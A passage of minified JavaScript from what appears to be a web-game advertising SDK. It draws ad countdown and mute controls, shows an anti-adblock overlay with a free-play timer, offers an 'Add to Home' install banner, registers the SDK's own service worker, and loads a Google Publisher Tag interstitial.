                        b.x + e > a.u().getBoundingClientRect().left + a.u().getBoundingClientRect().width - 10 ? d.x = a.u().getBoundingClientRect().right - a.u().getBoundingClientRect().left - e - 10 : d.x = b.x - a.u().getBoundingClientRect().left;
                        b.y + c > a.u().getBoundingClientRect().top + a.u().getBoundingClientRect().height - 10 ? d.y = a.u().getBoundingClientRect().bottom - a.u().getBoundingClientRect().top - c - 10 : d.y = b.y - a.u().getBoundingClientRect().top;
                        g && (d.y -= 30);
                        return d
                    },
                    yi: function() {
                        a.u().appendChild(a.$a);
                        a.contextMenu.Qd = a.F("div", "Logo");
                        a.u().appendChild(a.contextMenu.Qd);
                        a.tc(a.contextMenu.Qd, "mouseup touchend", function(b) {
                            b.preventDefault();
                            a.contextMenu.display({
                                x: 1E4,
                                y: 1E4
                            })
                        })
                    },
                    zi: function(b) {
                        var c = a.F("li");
                        b.link ? c.innerHTML = '<a href="' + b.link + '" target="_blank" rel="noreferrer">' + b.name + "</a>" : c.innerHTML = b.name;
                        a.$a.appendChild(c)
                    },
                    dm: function() {}
                }
            },
            Ea: null,
            Dd: "Ad 1 of 2: ()",
            Kg: -1,
            Ei: function() {
                a.Ea = a.F("div", "AdCounter");
                a.Ea.classList.add("wgHidden");
                a.Ea.innerText = a.Dd;
                a.s("." + a.Ea.classList[0] + "{ \n                pointer-events:none; \n                background:rgba(36,36,36,1); \n                border-radius:5px; \n                padding:10px; \n                bottom:50px; \n                left:15px; \n                font-size:12px; \n                font-weight:300; \n                font-family:roboto; \n                pointer-events:none; \n                position:absolute; \n                left:15px; \n                opacity:.8; \n                box-sizing:border-box; \n                color:#fff; \n                z-index:" +
                    v + "}");
                a.s("." + a.Ea.classList[0] + ".skippableAd{bottom:100px !important; }");
                a.u().insertBefore(a.Ea, a.u().firstChild)
            },
            ee: !1,
            tg: function() {
                if (!a.currentAd || !a.Mb(a.S.adTagUrl) && a.Pb && !a.Ue) return !1;
                a.Zh();
                if (!0 === a.ee || !0 === a.options.pd) return !1;
                a.currentAd.isSkippable() && a.Ea.classList.add("skippableAd");
                a.Ea.classList.remove("wgHidden");
                a.ee = !0;
                a.Kg = setInterval(function() {
                    a.Lk()
                }, 1E3)
            },
            we: function() {
                a.Ea && (a.Ea.classList.remove("skippableAd"), a.Ea.classList.add("wgHidden"), clearInterval(a.Kg), a.ee = !1)
            },
            Uh: function() {
                a.Dd = "Ad 1 of 2: ()"
            },
            Zh: function() {
                a.u().insertBefore(a.Ea, a.u().firstChild)
            },
            Lk: function() {
                if (null === a.B) return !1;
                var b = a.B.getRemainingTime(),
                    c = Math.floor(b / 60),
                    d = parseFloat(b - 60 * c).toFixed(0);
                b = Math.floor(b / 3600);
                var e = ""; - 1 < b ? e = (b ? b + ":" : "") + c + ":" + (10 > d ? "0" : "") + d : a.Ea.innerText.innerText = "";
                a.Ea.innerText = a.Dd.replace("()", "( " + e + " )")
            },
            ub: function(b) {
                if ("undefined" !== typeof f.titleExtract && "string" === typeof f.titleExtract && 0 < f.titleExtract.length) {
                    var c = f.titleExtract.split(","),
                        d = Math.ceil(c[1]),
                        e = decodeURIComponent(c[0]),
                        g = "";
                    b = b.split(e);
                    "right" === (c[2] || null) ? (c = b.length - d - 1, d = b.length - 1) : c = 0;
                    for (; c <= d; c++) g += void 0 !== b[c] ? b[c] : "", c < d && void 0 !== b[c] && void 0 !== b[parseInt(c + 1, 10)] && (g += e);
                    return g
                }
                return b
            },
            adBlock: function() {
                return {
                    Za: !1,
                    Ok: -1,
                    Ig: -1,
                    Rc: 0,
                    Hg: a.G().getBoundingClientRect(),
                    Kh: !1,
                    wj: function() {
                        this.ma.classList.add("wgHidden")
                    },
                    nk: function() {
                        !0 === this.Gg && this.Oa.getBoundingClientRect().height > a.G().getBoundingClientRect().height && (a.G().style.width = "100%", a.G().style.height = this.Hg.height + "px", a.G().appendChild(this.ma));
                        this.ma.classList.remove("hidden")
                    },
                    ej: function() {
                        a.Jc();
                        a.td();
                        this.Kh = !0;
                        this.wj();
                        this.Yb = a.F("div", "AdBlockCountDown");
                        this.Yb.innerHTML = "Game will close " + Math.ceil(f.disableAdBlock.freePlayTime) + " in seconds.";
                        a.s("." + this.Yb.className + "{ width:100%; background:#000; color:#fff; text-align:center; padding:10px; box-sizing:border-box; font-size:14px !important;}");
                        this.Oa.insertBefore(this.Yb, this.Oa.childNodes[0]);
                        this.Ig = setInterval(function() {
                            this.Rc < f.disableAdBlock.freePlayTime ? (this.Rc++, this.Yb.innerHTML = "Game will close " + Math.ceil(f.disableAdBlock.freePlayTime - this.Rc) + " in seconds.", a.j(112, this.Rc)) : this.Rg()
                        }.bind(this), 1E3)
                    },
                    Rg: function() {
                        clearInterval(this.Ig);
                        a.j(113, this.Rc);
                        this.Rc = 0;
                        this.nk();
                        this.Xb.parentNode && this.Xb.parentNode.removeChild(this.Xb);
                        this.Yb && this.Yb.parentNode && this.Yb.parentNode.removeChild(this.Yb);
                        this.ma.parentNode && this.ma.parentNode.removeChild(this.ma);
                        a.G().appendChild(this.de)
                    },
                    ig: null,
                    Fi: function() {
                        a.j(114);
                        a.Sb();
                        this.ma = a.F("div", "AdBlockMessage");
                        a.s("." + this.ma.className + "{ width:100%; background:rgba(0,0,0,0.85); z-index:" + v + "; font-size:20px !important; }");
                        a.s("." + this.ma.className + '::before{ content:" "; font-size:20px !important; transition:0.5s; }');
                        this.Pc = a.F("div", "AdBlockMessageText");
                        this.Pc.innerHTML = "<div>" + f.disableAdBlock.message + "</div>";
                        a.s("." + this.Pc.className + "{ position:absolute; width:100%; top:50%; color:#fff; text-align:center;}");
                        this.ma.appendChild(this.Pc);
                        !0 === f.disableAdBlock.enableFreePlay && (this.Xb = a.F("div", "AdBlockMessageFreePlayButton"), this.Xb.innerHTML = f.disableAdBlock.playButtonText.replace("%s", f.disableAdBlock.freePlayTime), a.s("." + this.Xb.className + "{ user-select:none; font-size:14px !important; display:inline-block; margin-top:30px; border-radius:15px; padding:10px 30px; cursor:pointer; background:#5baf00; color:#fff; text-align:center; transition:0.3s;}"), a.s("." + this.Xb.className + ":hover{ background:#366800;}"), this.Pc.appendChild(this.Xb), this.Xb.addEventListener(a.na, function() {
                            this.ej()
                        }.bind(this)));
                        a.j(15);
                        "undefined" !== typeof f.disableAdBlock.container ? (null !== document.getElementById(f.disableAdBlock.container) ? this.Oa = document.getElementById(f.disableAdBlock.container) : null !== document.querySelectorAll(f.disableAdBlock.container) && (this.Oa = document.querySelectorAll(f.disableAdBlock.container)[0]), this.Gg = !0, a.j(116)) : (this.Oa = a.G(), this.Gg = !1, a.j(117));
                        this.Jh();
                        this.Hg = this.Oa.getBoundingClientRect();
                        this.ig = new MutationObserver(function(b) {
                            for (var c = !1, d = w$b(b), e = d.next(); !e.done; e = d.next())
                                if (e = e.value, e.removedNodes)
                                    for (var g in e.removedNodes) - 1 < g.indexOf(this.ma) && (c = !0);
                            !0 !== this.Kh && !0 === c ? (this.ig.disconnect(), this.Rg(), a.j(118, b)) : this.ma.parentNode || this.de.parentNode || this.Jh()
                        }.bind(this));
                        this.ig.observe(a.G(), {
                            childList: !0,
                            subtree: !0
                        });
                        this.de = this.ma.cloneNode(!0);
                        this.de.firstChild.removeChild(this.de.firstChild.lastChild)
                    },
                    Jh: function() {
                        var b = !0 === f.disableAdBlock.enableFreePlay ? "overlay" : f.disableAdBlock.position;
                        this.ma.classList.remove("wgHidden");
                        "overlay" === b ? (this.Oa.classList.add("wgRelative"), this.Oa.appendChild(this.ma), a.s("." + this.ma.className + "{ position:absolute; top:0; left:0; height:100%; width:100%; background:rgba(0,0,0,0.85); }")) : "top" === b ? (a.s("." + this.Pc.className + "{ position:relative;}"), a.s("." + this.ma.className + "{ position:relative; width:100%; padding:20px; text-align:center; background:#000; box-sizing:border-box;}"), this.Oa.insertBefore(this.ma, this.Oa.childNodes[0])) : "bottom" === b ? (a.s("." + this.Pc.className + "{ position:relative;}"), a.s("." + this.ma.className + "{ position:relative; width:100%; padding:20px; text-align:center; background:#000; box-sizing:border-box;}"), a.Jj(this.Oa.lastChild, this.ma)) : (this.Oa.classList.add("wgRelative"), this.Oa.appendChild(this.ma), a.s("." + this.ma.className + "{ position:absolute; top:0; left:0; height:100%; width:100%; background:rgba(0,0,0,0.85); }"))
                    },
                    xi: function() {
                        a.G().classList.add("wgRelative");
                        this.Qc = a.F("div", "adBlockInfoContainer");
                        a.s("." + this.Qc.className + "{ cursor:pointer; width:100%; background:rgba(0,0,0,.8); z-index:" +
                            v + "; font-size:15px !important; color:#fff; position:absolute; text-align:center; padding:10px; left:0; box-sizing:border-box;}");
                        "top" === f.disableAdBlock.position ? a.s("." + this.Qc.className + "{top:0;}") : a.s("." + this.Qc.className + "{bottom:0;}");
                        this.Qc.innerHTML = f.disableAdBlock.info || "Please support us by disabling the AdBlock.";
                        a.G().insertBefore(this.Qc, a.G().firstChild);
                        this.Qc.addEventListener(a.na, function(b) {
                            b.target.parentNode.removeChild(b.target)
                        })
                    },
                    init: function() {
                        return f.disableAdBlock ? (!0 === a.options.fe && a.Hh(), this.Za = !0, "function" === typeof window[f.disableAdBlock.callback] && "none" === a.options.launchEvent && window[f.disableAdBlock.callback].call(this, {
                            ib: a.eb.ib
                        }), a.s(".wgRelative{position:relative !important; }"), a.s(".wgHidden{ display:none !important; visibility:hidden;}"), "undefined" !== typeof a.options.customCss && a.s(a.options.customCss), "undefined" !== typeof f.disableAdBlock && "undefined" !== typeof f.disableAdBlock.level && "info" === f.disableAdBlock.level ? (a.Jc(), a.td(), this.xi()) : this.Fi(), this) : !1
                    },
                    Jl: function() {}
                }
            },
            jingle: {
                ha: !1,
                audio: null,
                source: null,
                init: function() {
                    this.source.src = a.options.jingle;
                    this.audio.load()
                },
                play: function() {
                    this.Si() && (this.audio.play(), this.Ej())
                },
                stop: function() {
                    this.audio.stop()
                },
                Ej: function() {
                    var b = parseInt(a.te("jingleCount"), 10);
                    a.rg("jingleCount", b + 1)
                },
                Di: function() {
                    if (!a.qg || "undefined" === typeof a.options.jingle) return !1;
                    this.audio = document.createElement("audio");
                    this.source = document.createElement("source");
                    this.source.type = "audio/mpeg";
                    this.audio.appendChild(this.source);
                    this.ha = !0;
                    document.getElementsByTagName("body")[0].appendChild(this.audio)
                },
                Si: function() {
                    return 2 > a.te("jingleCount") ? !0 : !1
                }
            },
            Va: {
                Wc: null,
                me: !1,
                Va: null,
                rd: null,
                wl: -1,
                rl: null,
                mi: !1,
                init: function() {
                    a.j(119);
                    this.Gi();
                    window.onbeforeinstallprompt = function(b) {
                        b.preventDefault();
                        a.Va.Wc = b;
                        this.me = !0;
                        a.j(120)
                    }.bind(this);
                    navigator.serviceWorker && this.update()
                },
                kj: function() {
                    this.rd = {
                        url: window.location.href,
                        host: window.location.origin,
                        pathname: window.location.pathname,
                        thumbnail: a.options.gameThumbnail,
                        smallIcon: a.options.app && a.options.app.smallIcon ? a.options.app.smallIcon : a.options.gameThumbnail,
                        Qj: a.options.app && a.options.app.bigIcon ? a.options.app.bigIcon : a.options.gameThumbnail,
                        name: a.options.app && a.options.app.name ? a.options.app.name : a.eh(a.ub(a.options.gameName, a.options.titleExtract)),
                        category: a.options.app && a.options.app.category ? a.options.app.category : a.yc(),
                        shortName: a.options.app && a.options.app.shortName ? a.options.app.shortName : a.eh(a.ub(a.options.gameName, a.options.titleExtract)),
                        bgColor: a.options.app && a.options.app.bgColor ? a.options.app.bgColor : "#569aff",
                        Ff: a.options.app && a.options.app.Ff ? a.options.app.Ff : "#ff9600",
                        themeColor: a.options.app && a.options.app.themeColor ? a.options.app.themeColor : "#569aff",
                        display: a.options.app && a.options.app.display ? a.options.app.display : "standalone",
                        v: 1
                    }
                },
                lj: function() {
                    if (!0 === this.mi) return !1;
                    var b = "." + this.addToHome.classList[0] + "{ display:none; transform: translateY(-100px); position:absolute; width:100%; padding:14px; z-index:" +
                        v + "; background:" + this.rd.bgColor + "; color:#fff; top:0px; left:0px; box-sizing:border-box; font-family:roboto; border-bottom: 1px solid rgba(255,255,255,.2); box-shadow:1px 1px 9px 0px #203953; }";
                    a.s(b);
                    var c = a.F("div", "appInstallGameIcon");
                    b = "." + c.classList[0] + "{width:66px; height:66px; float:left; box-sizing:border-box; position:relative; box-shadow: 1px 1px 3px 0px #203953; margin-right: 10px; border-radius:5px; background-image: url(" + this.rd.Qj + "); background-repeat:no-repeat; background-size:cover; border:3px solid #8fa8c1;}";
                    this.addToHome.appendChild(c);
                    c = a.F("div", "appInstallGameName");
                    c.innerText = this.rd.shortName;
                    b += "." + c.classList[0] + "{font-size:23px; font-weight:600; font-family:roboto; text-transform:uppercase; letter-spacing:-1px; max-width: 75%; text-align:left;}";
                    this.addToHome.appendChild(c);
                    c = a.F("div", "appInstallGameCategory");
                    c.innerHTML = this.rd.category;
                    b += "." + c.classList[0] + "{font-size:13px; font-weight:300; font-family:roboto; letter-spacing:0px; text-align:left; }";
                    this.addToHome.appendChild(c);
                    c = a.F("div", "appInstallCloseButton");
                    c.innerText = "Close";
                    b += "." + c.classList[0] + "{position:absolute; cursor:pointer;  top:14px; right:14px; color:#fff; font-size:12px; opacity:.6; font-weight:300;}";
                    b += "." + c.classList[0] + ':after{content:" "; width:10px; height:10px; display:inline-block; padding-left:5px; font-size:14px; font-family:roboto; background-repeat:no-repeat; background-position:center center; background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAkAAAAJCAYAAADgkQYQAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAIlJREFUeNpimHXm/xIgdv///z8DOgaJA/EyJgYGhsVAvGL2WQZ3BiQA5a8A4kVMqcYMO4GMCGSFSAoigfI7GEHGokl0A3EpTAFYEs0N1UD8D4hrkMWZ0NxQAsR1QFwM5HvA5JiwuKEFRAPxcphCRpA3kR2JZDJIwXKQOMikeHQFIADlg0yMAwgwAGKFYmjopVc5AAAAAElFTkSuQmCC)}';
                    this.addToHome.appendChild(c);
                    c.addEventListener(a.na, this.Uf.bind(this), {
                        passive: !0
                    });
                    c = a.F("div", "appInstallButton");
                    c.innerText = "ADD TO HOME";
                    b += "." + c.classList[0] + "{position:absolute; cursor:pointer; right:14px; bottom:14px; color:#fff; font-weight:600; font-size:16px; leter-spacing:-1px; text-transform:uppercase; background-color:" + this.rd.Ff + "; border:1px solid #2f5378; box-shadow: 1px 1px 3px 0px #203953; padding:10px 15px; border-radius:5px;}";
                    this.addToHome.appendChild(c);
                    c.addEventListener(a.na, this.Ci.bind(this), {
                        passive: !0
                    });
                    a.s(b);
                    this.mi = !0
                },
                update: function() {
                    var b = this,
                        c = !1;
                    navigator.serviceWorker.getRegistrations().then(function(d) {
                        a.j(121);
                        for (var e in d) a.j(122, d[e]), d[e].unregister()
                    }.bind(this)).then(function() {
                        a.j(123);
                        "serviceWorker" in navigator ? navigator.serviceWorker.register(location.protocol + "//" + location.host + "/weegoo-sw.js", {
                            scope: location.protocol + "//" + location.host
                        }).then(function() {
                            a.j(124);
                            navigator.serviceWorker.addEventListener("message", function() {
                                c || (c = !0)
                            });
                            this.kj();
                            this.lj()
                        }.bind(b)).catch(function(d) {
                            a.j(125, d)
                        }) : a.j(126)
                    }).catch(function(d) {
                        console.log(d)
                    })
                },
                addToHome: null,
                Gi: function() {
                    this.addToHome = a.F("div", "addToHome");
                    (new Promise(function(b) {
                        var c = setInterval(function() {
                            a.u() && (clearInterval(c), b())
                        }, 100)
                    })).then(function() {
                        a.G().appendChild(a.Va.addToHome)
                    })
                },
                Uf: function() {
                    this.addToHome.classList.remove("wgVisible");
                    this.addToHome.classList.remove("slideInFromTop");
                    a.contentContainer.classList.remove("wgRelative");
                    a.Va.me = !1
                },
                ei: function() {
                    this.addToHome.classList.add("wgVisible");
                    this.addToHome.addEventListener(a.na, this.addToHome);
                    a.isMobile() || "static" === window.getComputedStyle(a.contentContainer).position && a.contentContainer.classList.add("wgRelative");
                    setTimeout(function() {
                        this.addToHome.classList.add("slideInFromTop")
                    }.bind(this), 100)
                },
                Ci: function() {
                    this.Uf();
                    this.Wc.prompt();
                    this.Wc.userChoice.then(function(b) {
                        "accepted" === b.outcome ? a.j(127) : a.j(128);
                        this.Uf();
                        a.Va.Wc = null
                    }.bind(this))
                }
            },
            interstitial: {
                Fb: {},
                Dc: null,
                init: function(b) {
                    var c = this;
                    a.Gb ? this.Gb.call(this, b) : (this.Fb = a.F("SCRIPT"), document.head.appendChild(this.Fb), this.Fb.addEventListener("load", function() {
                        c.Gb.call(c, b)
                    }), this.Fb.src = "https://securepubads.g.doubleclick.net/tag/js/gpt.js")
                },
                Gb: function(b) {
                    var c = window.googletag || {
                        cmd: []
                    };
                    c.cmd.push(function() {
                        if (this.Dc = c.defineOutOfPageSlot(b, c.enums.OutOfPageFormat.INTERSTITIAL)) this.Dc.addService(c.pubads()), c.pubads().addEventListener("slotOnload", function(d) {
                            this.Dc === d.slot && a.j(192)
                        }.bind(this));
                        c.enableServices();
                        c.cmd.push(function() {
                            c.pubads().isInitialLoadDisabled() ? (c.display(this.Dc), c.pubads().refresh([this.Dc])) : c.display(this.Dc)
                        }.bind(this))
                    })
                }
            },
            X: {
                ha: !1,
                isVisible: !1,
                Lb: {
                    qb: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 30 30'%3E%3Ccircle fill='%232e2f33' cx='15' cy='15' r='15' /%3E%3Cpath fill='%23fff' d='M17,7.63v1a6.54,6.54,0,0,1,0,12.84v.95A7.47,7.47,0,0,0,17,7.63Z' /%3E%3Cpath fill='%23fff' d='M20.45,15A4.75,4.75,0,0,0,17,10.43v1.11a3.68,3.68,0,0,1,0,6.92v1.11A4.75,4.75,0,0,0,20.45,15Z' /%3E%3Cpolygon fill='%23fff' points='6.8 11.48 6.8 18.52 9.85 18.52 14.74 22.5 14.74 7.5 9.85 11.48 6.8 11.48' /%3E%3C/svg%3E",
                    yb: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 30 30'%3E%3Ccircle fill='%232e2f33' cx='15' cy='15' r='15' /%3E%3Cpolygon fill='%23fff' points='6.8 11.48 6.8 18.52 9.85 18.52 14.74 22.5 14.74 7.5 9.85 11.48 6.8 11.48' /%3E%3Cpolygon fill='%23fff' points='23.42 12.61 22.5 11.69 20.11 14.08 17.71 11.69 16.79 12.61 19.18 15 16.79 17.39 17.71 18.32 20.11 15.92 22.5 18.32 23.42 17.39 21.03 15 23.42 12.61' /%3E%3C/svg%3E"
                },
                mg: {},
                duration: 0,
                Qk: {
                    Je: !0
                },
                elements: {
                    container: null,
                    time: null,
                    je: null,
                    progress: null,
                    gb: null,
                    Te: null,
                    lc: null,
                    resume: null
                },
                init: function() {
                    this.duration = a.B.getCurrentAd().getDuration();
                    this.ha ? (this.reset(), this.show(), a.u().insertBefore(this.elements.container, a.u().firstChild)) : (this.elements.container = a.F("div", "cCounterContainer"), a.s("." + this.elements.container.classList[0] + "{width:100%; padding:2px; box-sizing: border-box; border-top:10px solid transparent; position:absolute; bottom:0; left:0; color:#fff; z-index:2147483647}"), this.elements.container.classList.add("wgHidden"), this.elements.time = a.F("div", "cCounterTime"), a.s("." + this.elements.time.classList[0] + '{width:100%; padding:2px;  pointer-events:none; /*background:rgba(36,36,36,1);*/ box-sizing: border-box; text-align:center; font-size:14px; font-family:"Open sans"; pointer-events:none; display:block; z-index:' + v + "}"), a.s("." + this.elements.time.classList[0] + ':before{content:""; display:block; height:10px;}'), this.elements.container.appendChild(this.elements.time), this.elements.je = a.F("div", "cCounter"), a.s("." + this.elements.je.classList[0] +
                        "{width:100%; pointer-events:none;  box-sizing:border-box; pointer-events:none; border:1px solid #f8c508; z-index:" + v + "}"), this.elements.container.appendChild(this.elements.je), this.elements.lc = a.F("div", "cCounterLm"), a.s("." + this.elements.lc.classList[0] + "{display:none !important; position:fixed; display: inline-block; font-family: arial,sans-serif; top:0; left:0; width:100%; box-sizing: border-box; pointer-events:none; cursor:pointer; color:#fff;  padding: 5px; font-size:16px; line-height:normal; font-weight:normal;  text-align:right; background-image: -webkit-linear-gradient(top,rgba(0,0,0,0.8),rgba(0,0,0,0.7) 40%,rgba(0,0,0,0) 99%); background-image: -moz-linear-gradient(top,rgba(0,0,0,0.8),rgba(0,0,0,0.7) 40%,rgba(0,0,0,0) 99%); background-image: -ms-linear-gradient(top,rgba(0,0,0,0.8),rgba(0,0,0,0.7) 40%,rgba(0,0,0,0) 99%); background-image: -o-linear-gradient(top,rgba(0,0,0,0.8),rgba(0,0,0,0.7) 40%,rgba(0,0,0,0) 99%); background-image: linear-gradient(top,rgba(0,0,0,0.8),rgba(0,0,0,0.7) 40%,rgba(0,0,0,0) 99%); background-color: rgba(0,0,0,0);}"), this.elements.lc.innerHTML = "Learn more", this.elements.container.appendChild(this.elements.lc), this.elements.Te = a.F("div", "cCounterShield"), a.s("." + this.elements.Te.classList[0] + "{display:none; position:fixed; bottom:0; left:0; width:100%; height:calc(100% - 34px); border:" + (a.Ga() ? "2px dashed #000" : "none") + "; box-sizing: border-box; }"), this.elements.container.appendChild(this.elements.Te), this.elements.Te.addEventListener(a.na, this.zg.bind(this)), this.elements.progress = a.F("div", "cCounterProgress"), a.s("." + this.elements.progress.classList[0] + "{pointer-events:none; background:#f8c508; box-sizing: border-box; padding:2px; }"), this.elements.je.appendChild(this.elements.progress), this.elements.gb = a.F("div", "cCounterSound"), this.elements.gb.classList.add("wgHidden"), a.s("." + this.elements.gb.classList[0] + '{position:fixed; transition:.2s !important;  bottom:8px; left:15px; width:25px; height:25px; border-radius:50%; cursor:pointer; background-image:url("' + this.Lb.qb + '"); background-repeat:no-repeat; background-position:center center; background-size:123%;}'), a.s("." + this.elements.gb.classList[0] + '.muted{background-image:url("' + this.Lb.yb + '");}'), a.s("@keyframes popInSnd { 0%{ -webkit-transform: scale(0); transform: scale(0); opacity: 1;} 70% { -webkit-transform: scale(1); transform: scale(1); opacity: 1;} 100% { -webkit-transform: scale(.8); transform: scale(.8); opacity: 1; } }"), a.s("@keyframes popInSndHover { 0%{ -webkit-transform: scale(.8); transform: scale(.8); opacity: 1;} 100%{ -webkit-transform: scale(.9); transform: scale(.9); opacity: 1;}}"), a.s("." + this.elements.gb.classList[0] + ":not(.wgHidden){animation:popInSnd .3s forwards;}"), this.elements.container.appendChild(this.elements.gb), this.elements.gb.addEventListener(a.na, this.Jk.bind(this)), this.elements.resume = a.F("div", "cCounterResume"), a.s("." + this.elements.resume.classList[0] + "{\n                        position:fixed; \n                        transition:.2s !important; \n                        bottom:8px; \n                        left:45px; \n                        width:25px; \n                        height:25px; \n                        cursor:pointer;\n                        background:#2e2f33;\n                        border-radius:50%;\n                    }"), a.s("." + this.elements.resume.classList[0] + ":before{ \n                        position:relative; \n                        box-sizing:border-box; \n                        display:flex; \n                        font-size:20px; \n                        padding-top:1px; \n                        text-align:center; color:#fff; \n                        content:' '; \n                        width:100%; \n                        height:100%; \n                        top:0; \n                        left:0; \n                        align-items: center; \n                        text-align: center; \n                        justify-content: space-evenly;\n                        background:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAmCAYAAACsyDmTAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyRpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDcuMS1jMDAwIDc5LmRhYmFjYmIsIDIwMjEvMDQvMTQtMDA6Mzk6NDQgICAgICAgICI+IDxyZGY6UkRGIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+IDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiIHhtbG5zOnhtcD0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLyIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bXA6Q3JlYXRvclRvb2w9IkFkb2JlIFBob3Rvc2hvcCAyMi41IChXaW5kb3dzKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDo1NzAyODQzNDUxMDUxMUVDOTUzQTk5NTJDNTY0ODYyRSIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDo1NzAyODQzNTUxMDUxMUVDOTUzQTk5NTJDNTY0ODYyRSI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjU3MDI4NDMyNTEwNTExRUM5NTNBOTk1MkM1NjQ4NjJFIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjU3MDI4NDMzNTEwNTExRUM5NTNBOTk1MkM1NjQ4NjJFIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+GNdJXQAAA9FJREFUeNrMmN9LU2EYx885O+6HmDpwSYEKSmlCCl24XU1QsX9AL7oxvKluQm8qC8ougsjEQRGLvJK8KROSTGikSIjCQDaVVl5s6jZhusxN5+acO6fnXee1s3nU/Thn9sDLeXE/zmff5/s873MkWZYl5ufnCX7U1taSRELMzc2xhIQB94xdafwHkiSJmpoaPgh/z2JIqcEovEEwy8vL137/jZ9or9VqKQ4MX2PqCSkoOhCKgoKCV/n5+YWwLhYXFw+OjY1NLSws6Lj3UYlgkgPRNF0ok8kItBQKBQFg2vLy8m+rq6v9JpPpfCKYFGpRR72APAWAhEqlojQazXWdTvd9ZWXlQUdHh5JT6WCJCUbiKkNfuL29zeTl5Qm+kWEYIhKJEMFg0O71eu9XVlZ+RGZPWGlXJK4yiueHY38hRVE4jRUlJSXv19fXv5rN5sti+4tK9QPIX0qlklCr1frq6moz+Ovl0NDQWbH8RaWVZ85fubm5NPjrZnNzs21pael2e3t7Tqb+inmIRHeAPXgoepSHjguev35AKu9WVVV9SdVfcR7KuFTBX3K5HPnrUmlp6ae1tbWR6enpC2n5CymEuzEoxGYaoBYLarHwXWG3220YGBhA/kKplCXAkaAWgZdkQHywcDjM+nw+r91uv1FfX6/gzk5BMMmBcESjUTYUCrEbGxsWm83WxKnFB4tvOVIDYbX29/fZnZ0d1uPxvJucnKw4EiwbQHywvb095K+gy+V6ajAY1IegsgnETyPyF4w5TqvV2sQ3vSh9KN2ANBJ+v99dVFSEUsggB1HE/xEHxqZP4+4oK1xn98BkekvSxpikqcMA0tPd3a2B+6L5Sn5g7lMo+5HR0VE0tqh4MP86eTYa4+7uLmqMttnZ2as8EEWcMlKXPe/o+LW4uNjZ2Nh4JgEkO40RH66BQCDidDpf9/X1nRNIT3aODuQTqBzkE9P4+PiVhPTkJHO4ilL2eEAD0zpg5LgHM89ngQGNwRrggU1oWKMz7Seo28Jp7odJ8VlXV5dxeHh4VwCGPQkkIyAEAtVDQE9hNjc3BycmJh63tbV5eEqw6T4ipQyEQFB6tra2pqB67ur1eqtAavgQbDIgKQMhn6D0gGld8OjzqKGhAT2bMZmkJy0g7BPoKSEAeN7b2/vCaDQGj0lNWiBxQOjD+DGED4JU4Zrbh5mZmYctLS1OMXyStEKgRAA8EhuIuDK2OhyOzrq6OrOYPkkaCIx6By49oIwPqudJa2vrW4vFktg/REvPiUBlZWVv4NJ/qJ0LA0ny7z1a4KZCe0KK9AjFHwEGAHovhV3ojVdJAAAAAElFTkSuQmCC') no-repeat center center transparent;\n                        background-size:16px; \n                    }"), a.s("." + this.elements.resume.classList[0] + ":not(.wgHidden){animation:popInSnd .3s forwards;}"), this.elements.resume.classList.add("wgHidden"), this.elements.container.appendChild(this.elements.resume), this.elements.resume.addEventListener(a.na, this.zg.bind(this)), a.u().insertBefore(this.elements.container, a.u().firstChild), this.ha = !0);
                    this.start.call(this);
                    this.show.call(this);
                    !0 !== a.bb || a.De() || !0 !== a.options.he && this.yb.call(this)
                },
                Jk: function(b) {
                    b && b.preventDefault();
                    0 < a.B.getVolume() ? this.qb() : this.yb()
                },
                zg: function(b) {
                    b && b.preventDefault();
                    !0 === a.Ka ? (a.B.pause(), a.Ka = !1, a.va.yd(), this.elements.resume.classList.remove("wgHidden")) : (a.B.resume(), a.Ka = !0, a.va.Hb(), this.elements.resume.classList.add("wgHidden"), a.va.Hb())
                },
                yd: function() {
                    this.elements.resume.classList.remove("wgHidden")
                },
                Hb: function() {
                    this.elements.resume.classList.add("wgHidden")
                },
                Ze: function() {
                    this.elements.gb.classList.remove("wgHidden")
                },
                ye: function() {
                    this.elements.gb.classList.add("wgHidden")
                },
                qb: function() {
                    a.B.setVolume(0);
                    this.elements.gb.classList.add("muted")
                },
                yb: function() {
                    try {
                        a.B.setVolume(1)
                    } catch (b) {}
                    this.elements.gb.classList.remove("muted")
                },
                start: function() {
                    this.mg = requestAnimationFrame(this.update.bind(this))
                },
                stop: function() {
                    this.elements.progress.style.width = "100%";
                    cancelAnimationFrame(this.mg);
                    this.reset.call(this);
                    this.aa.call(this);
                    this.ye.call(this);
                    this.yb.call(this)
                },
                show: function() {
                    this.elements.container.classList.remove("wgHidden");
                    this.isVisible = !0
                },
                aa: function() {
                    this.elements.container.classList.add("wgHidden");
                    this.isVisible = !1
                },
                reset: function() {
                    this.elements.time.innerText = "";
